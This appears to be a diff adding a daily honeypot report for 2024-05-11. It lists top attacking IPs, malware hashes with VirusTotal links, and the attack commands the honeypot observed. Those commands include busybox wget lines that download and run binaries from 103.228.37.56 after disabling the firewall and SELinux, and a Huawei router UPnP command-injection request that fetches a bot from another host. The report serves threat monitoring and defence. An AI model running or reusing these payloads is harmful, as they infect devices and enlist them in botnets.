@@ -1,0 +1,61 @@
+Top 5 IPs for 2024-05-11 :
+
+167.99.57.109
+123.57.3.159
+117.214.254.130
+182.124.70.29
+188.18.12.218
+
+Malware Download:
+
+95cdf53dfda4bc0fefec0fea0c77fe49ee79a957732e0565360fae6050967d65
+https://www.virustotal.com/gui/file/95cdf53dfda4bc0fefec0fea0c77fe49ee79a957732e0565360fae6050967d65
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+
+Commands/exploits observed:
+
+GET /and HTTP/1.1
+Host: 103.228.37.56
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+pkill -f M
+pkill -f arm7
+pkill -f arm
+pkill -f x86
+pkill -f x86_64
+su 0 pkill -f M
+su 0 pkill -f arm7
+su 0 pkill -f arm
+su 0 pkill -f x86
+su 0 pkill -f x86_64
+su 0 iptables -F
+su 0 setenforce 0
+su 0 busybox wget http://103.228.37.56/a -O /data/local/tmp/a; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a
+busybox wget http://103.228.37.56/a; chmod 777 a;sh a
+busybox wget http://103.228.37.56/most-arm; chmod 777 most-arm; ./most-arm android.exploit
+busybox wget http://103.228.37.56/most-arm5; chmod 777 most-arm5; ./most-arm5 android.exploit
+busybox wget http://103.228.37.56/most-arm6; chmod 777 most-arm6; ./most-arm6 android.exploit
+busybox wget http://103.228.37.56/most-arm7; chmod 777 most-arm7; ./most-arm7 android.exploit
+busybox wget http://103.228.37.56/most-m68k; chmod 777 most-m68k; ./most-m68k android.exploit
+busybox wget http://103.228.37.56/most-mips; chmod 777 most-mips; ./most-mips android.exploit
+busybox wget http://103.228.37.56/most-mpsl; chmod 777 most-mpsl; ./most-mpsl android.exploit
+busybox wget http://103.228.37.56/most-ppc; chmod 777 most-ppc; ./most-ppc android.exploit
+busybox wget http://103.228.37.56/most-sh4; chmod 777 most-sh4; ./most
+
+
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
+Content-Length: 492
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(rm -rf /tmp/linuxxx; /bin/busybox wget -g 103.174.73.190 -l /tmp/linuxxx -r /tajma.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.tajma)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
